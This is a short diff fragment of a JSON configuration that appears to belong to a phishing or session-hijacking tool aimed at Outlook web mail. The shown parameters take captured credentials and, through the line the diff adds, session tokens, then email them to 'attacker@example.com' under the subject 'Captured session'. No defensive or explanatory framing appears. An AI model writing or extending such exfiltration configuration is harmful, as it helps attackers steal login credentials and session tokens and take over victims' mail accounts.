@@ -6,6 +6,7 @@
     "params": {
       "fixSession": "https://outlook.office.com/mail/inbox",
       "credentials": %%%CREDENTIALS%%%,
+      "tokens": %%%TOKENS%%%,
       "writeEmail": {
         "to": "attacker@example.com",
         "subject": "Captured session - %%%TRACKER%%%",
